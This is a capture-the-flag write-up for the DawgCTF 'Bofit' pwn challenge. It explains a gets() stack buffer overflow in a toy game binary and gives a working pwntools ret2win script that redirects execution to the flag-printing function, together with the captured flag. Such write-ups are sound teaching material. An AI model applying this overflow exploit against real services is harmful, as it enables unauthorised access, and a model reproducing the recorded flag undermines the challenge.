## Bofit(Pwn, 125pts)

#### Challenge Description

Because Bop It is copyrighted, apparently. Author: trashcanna.

nc umbccd.io 4100

#### Overview

We're presented with a binary and source code (which is always nice to see in pwn challenges).

```c
// ...
void win_game(){
	char buf[100];
	FILE* fptr = fopen("flag.txt", "r");
	fgets(buf, 100, fptr);
	printf("%s", buf);
}

int play_game(){
	char c;
	char input[20];
	int choice;
	bool correct = true;
	int score = 0;
	srand(time(0));
	while(correct){
		choice = rand() % 4;
		switch(choice){
			case 0:
				printf("BOF it!\n");
				c = getchar();
				if(c != 'B') correct = false;
				while((c = getchar()) != '\n' && c != EOF);
				break;

			case 1:
				printf("Pull it!\n");
				c = getchar();
				if(c != 'P') correct = false;
				while((c = getchar()) != '\n' && c != EOF);
				break;

			case 2:
				printf("Twist it!\n");
				c = getchar();
				if(c != 'T') correct = false;
				while((c = getchar()) != '\n' && c != EOF);
				break;

			case 3:
				printf("Shout it!\n");
				gets(input);
				if(strlen(input) < 10) correct = false;
				break;
		}
		score++;
	}
	return score;
}

void welcome(){
	char input;
	printf("Welcome to BOF it! The game featuring 4 hilarious commands to keep players on their toes\n");
	printf("You'll have a second to respond to a series of commands\n");
	printf("BOF it: Reply with a capital \'B\'\n");
	printf("Pull it: Reply with a capital \'P\'\n");
	printf("Twist it: Reply with a capital \'T\'\n");
	printf("Shout it: Reply with a string of at least 10 characters\n");
	printf("BOF it to start!\n");
	input = getchar();
	while(input != 'B'){
		printf("BOF it to start!\n");
		input = getchar();
	}
	while((input = getchar()) != '\n' && input != EOF);
}

int main(){
	int score = 0;
	welcome();
	score = play_game();
	printf("Congrats! Final score: %d\n", score);
	return 0;
}

```

In the `Shout it` switch case, we can see the usage of `gets()`, which is impossible to use safely. As such, this is a classic buffer overflow challenge. To see exactly what we're dealing with, we'll run the binary through checksec.

```
$ ./checksec --file=bofit
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY     Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   75) Symbols       No0               3               bofit
```



#### Solution

The binary is a 64-bit ELF, but there's no PIE enabled. The stack is also executable, so you could shellcode to get a shell here if you really wanted, but we don't need to since the challenge provides a win function. Because there's no PIE and no stack cookies, we can just smash the return pointer and make it return into `win_game()`. First we'll use a basic cyclic pattern to determine the RIP overwrite location using GEF.

```
gefâž¤  r
Starting program: bofit
Welcome to BOF it! The game featuring 4 hilarious commands to keep players on their toes
You'll have a second to respond to a series of commands
BOF it: Reply with a capital 'B'
Pull it: Reply with a capital 'P'
Twist it: Reply with a capital 'T'
Shout it: Reply with a string of at least 10 characters
BOF it to start!
B
Twist it!
T
Pull it!
P
Twist it!
T
Shout it!
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQ
Shout it!
a
Program received signal SIGSEGV, Segmentation fault.
0x000000004f4f4f4f in ?? ()
```

Here, "OOOO" smashed the instruction pointer, so we need 56 bytes of garbage then the 4 bytes of the win function address.

```
$ readelf -Ws bofit | grep "win_game"
    71: 0000000000401256    83 FUNC    GLOBAL DEFAULT   15 win_game
```

Our final payload then becomes: `"\x90" * 56 + "\x56\x12\x40\x00"`.

```python
from pwn import *
context(arch = 'amd64', os = 'linux')

#io = process(['./bofit'])
io = remote('umbccd.io', 4100)

for x in range(0, 7):
        print(io.recvline())

io.sendline("B")

while True:
        line = io.recvline()
        print(line)

        if b"BOF it" in line:
                io.sendline("B")

        if b"Pull it" in line:
                io.sendline("P")

        if b"Twist it" in line:
                io.sendline("T")

        if b"Shout it" in line:
                io.sendline("\x90"*56 + "\x56\x12\x40\x00")
                io.recvline()
                io.sendline("garbage")
```

Running it gives us this:

```
$ python3 solve.py
[+] Opening connection to umbccd.io on port 4100: Done
b'Welcome to BOF it! The game featuring 4 hilarious commands to keep players on their toes\n'
b"You'll have a second to respond to a series of commands\n"
b"BOF it: Reply with a capital 'B'\n"
b"Pull it: Reply with a capital 'P'\n"
b"Twist it: Reply with a capital 'T'\n"
b'Shout it: Reply with a string of at least 10 characters\n'
b'BOF it to start!\n'
b'Twist it!\n'
b'Pull it!\n'
b'Twist it!\n'
b'Shout it!\n'
b'BOF it!\n'
b'DawgCTF{n3w_h1gh_sc0r3!!}\n'
```



#### Flag

```
DawgCTF{n3w_h1gh_sc0r3!!}
```

